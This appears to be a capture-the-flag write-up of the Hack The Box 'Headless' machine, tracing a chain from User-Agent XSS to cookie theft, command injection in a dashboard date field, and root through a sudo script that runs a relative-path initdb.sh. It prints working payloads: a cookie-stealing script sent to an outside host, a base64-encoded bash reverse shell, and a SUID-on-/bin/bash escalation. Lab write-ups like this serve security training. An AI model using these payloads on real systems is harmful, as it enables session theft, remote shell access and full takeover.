---
layout: post
title: "HTB: Headless"
box: headless
img: /img/headless/headless
author: Andrew Cherney
date: 2024-11-02
tags: htb easy-box season-4 linux webapp xss command-injection
icon: "assets/icons/headless.png"
post_description: "Begins with XXS into stealing an admin cookie. Post accessing the admin dashboard the tool present can be injected with linux commands, including curl which is used to download a shell. The script the user can run as sudo can be exploited to run arbitrary code and gain a root shell."
---

# Summary

{{ page.post_description }}

# Enumeration

## nmap

```bash
nmap -p- 10.10.11.8

PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp


nmap -sC -sV -p22,5000 10.10.11.8 

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Fri, 29 Mar 2024 04:03:46 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```

## Port 5000 - http?

Well that is a little peculiar. Werkzeug running on port 5000 with HTTP 1.1 returning OK. Let's check if this is a proper site.

```bash
curl 10.10.11.8:5000

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Under Construction</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f7f7f7;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
...
```

{% include img_link src="/img/headless/headless_5000_front_page" alt="front_page" ext="png" trunc=600 %}

I looked over the webpage and there wasn't any link or reference besides support.

![support]({{ page.img }}_5000_support_contact.png)

```bash
dirsearch -u http://10.10.11.8:5000

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Active/Headless/reports/http_10.10.11.8_5000/_24-03-28_23-08-10.txt

Target: http://10.10.11.8:5000/

[23:08:10] Starting: 
[23:09:33] 401 -  317B  - /dashboard
[23:10:47] 200 -    2KB - /support
```

It's safe to say on this easy box we need to somehow access that dashboard. 

![dashboard fail]({{ page.img }}_5000_dashboard_unauthorized.png)

I did check some formats of sending different user/pass data but I couldn't find a way to get a positive response. On to the support page.

So here we have a handful of parameters that get passed to some backend that processes them. A way to traditionally interact with these portals is XSS or template injection, with the former of the 2 being marginally easier to test for. Below is my test payload for every parameter:

```javascript
<img src=x onerror=this.src="http://10.10.14.5:8081/?"+document.cookie;>
```

![hack detected]({{ page.img }}_5000_hacking_attempt.png)

My message wasn't passed through, or any parameter for that matter which I sent XSS through. This message does leak some important information however. The User-Agent is stored in a place where only admins can access. And that sounds to me like a prime XSS target.

# User as dvir

## User-Agent XSS

Traditionally the User-Agent header can't be used for injection purposes and this is to my knowledge one of the few cases where it can be: when you deliberately store the User-Agent from a request for future viewing. Now to the exploit.

```html
POST /support HTTP/1.1
Host: 10.10.11.8:5000
Content-Length: 86
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.8:5000
Content-Type: application/x-www-form-urlencoded
User-Agent: <script>document.location='http://10.10.14.5/?'+document.cookie</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.11.8:5000/support
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

fname=raccoon&lname=raccoon&email=raccoon%40raccoon.com&phone=123123&message=raccoon<>
```

Typically I try to use an img this.src fetch combo to test XSS but after testing there was an issue having spaces in the XSS of User-Agent. I opted for script and document.location instead, then calling the hack detection by using a double bracket in the message field.

```bash
sudo python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.8 - - [29/Mar/2024 00:30:38] "GET /?is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -
```

Well that would explain why my attempts to make valid parameters for dashboard failed. I can toss this into the Cookies section of the Storage tab within dev tools and access the dashboard now.

![admin dashboard]({{ page.img }}_5000_admin_dashboard.png)

## Command Injection

Intercepting this request reveals it sends the date parameter with a date attached. And I went out of my way to check what symbols are allowed and not allowed.

```html
date=2023-09-15

errors from:
'"|

expected response from:
/&&.,;:
```

And in my testing I decided to check using grave accents to curl my webserver.

```bash
date=1`curl+http%3a//10.10.14.5%3a8081/test`

httpserver 

Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.8 - - [29/Mar/2024 00:48:24] code 404, message File not found
10.10.11.8 - - [29/Mar/2024 00:48:24] "GET /test HTTP/1.1" 404 -
```

Revshell and we have our user.

```bash
bash -i >& /dev/tcp/10.10.14.5/7777 0>&1
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Lzc3NzcgMD4mMQ==

echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41Lzc3NzcgMD4mMQ==' | base64 -d | bash

date=1`echo+'YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC41Lzc3NzcgMD4mMQ%3d%3d'+|+base64+-d+|+bash`
```

```bash
nc -vnlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.8 45906
bash: cannot set terminal process group (1359): Inappropriate ioctl for device
bash: no job control in this shell
dvir@headless:~/app$ cd ~
cd ~
dvir@headless:~$ ls
ls
app
geckodriver.log
user.txt
dvir@headless:~$ cat user.txt
cat user.txt
d031f24e9a----------------------
```

# Root

Common enum gave me the next trajectory with sudo l.

```bash
dvir@headless:~$ sudo -l
sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

```bash
dvir@headless:~$ file /usr/bin/syscheck
file /usr/bin/syscheck
/usr/bin/syscheck: Bourne-Again shell script, ASCII text executable
dvir@headless:~$ cat /usr/bin/syscheck
cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
dvir@headless:~$ sudo /usr/bin/syscheck
sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.00, 0.04, 0.02
Database service is not running. Starting it...
```

Running through the script we can see a file **initdb.sh** referenced in the same directory as it's being ran, and if we run the script we see it does pass through that if statement and supposedly run that bash script (designated by the **Database service is not running. Starting it...** line). I will do my classic test of placing whoami inside of a bash script to ensure I know who runs **initdb.sh** and test for arbitrary code execution. It is most certainly root but it's a habit that grabs more info through a test.

```bash
cat initdb.sh 

#!/bin/bash
whoami >> whoami
```

```bash
httpserver 

Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.8 - - [29/Mar/2024 01:05:47] "GET /initdb.sh HTTP/1.1" 200 -
```

***Future note**: I have no idea why I didn't just write the script on the machine and run it.*

```bash
vir@headless:~$ wget http://10.10.14.5:8081/initdb.sh
wget http://10.10.14.5:8081/initdb.sh
--2024-03-29 09:26:37--  http://10.10.14.5:8081/initdb.sh
Connecting to 10.10.14.5:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 29 [text/x-sh]
Saving to: ‘initdb.sh’

     0K                                                       100% 2.04M=0s

2024-03-29 09:26:37 (2.04 MB/s) - ‘initdb.sh’ saved [29/29]

dvir@headless:~$ ls
ls
app
geckodriver.log
initdb.sh
user.txt
dvir@headless:~$ chmod +x initdb.sh
chmod +x initdb.sh
dvir@headless:~$ sudo /usr/bin/syscheck
sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.03, 0.01, 0.00
Database service is not running. Starting it...
dvir@headless:~$ cat whoami
cat whoami
root
```

Now I can append chmod to make bash an suid.

***Another Future note**: I should have made a new /bin/bash and made that an SUID, any other player could have gotten root through seeing bash was an SUID and it's generally bad practice imo.*

```bash
dvir@headless:~$ echo 'chmod u+s /bin/bash' >> initdb.sh
echo 'chmod u+s /bin/bash' >> initdb.sh
dvir@headless:~$ cat initdb.sh
cat initdb.sh
#!/bin/bash
whoami >> whoami
chmod u+s /bin/bash
```

```bash
dvir@headless:~$ sudo /usr/bin/syscheck
sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.03, 0.02, 0.00
Database service is not running. Starting it...
dvir@headless:~$ /bin/bash -p
/bin/bash -p
whoami
root
cat /root/root.txt
6a12cc80007---------------------
```
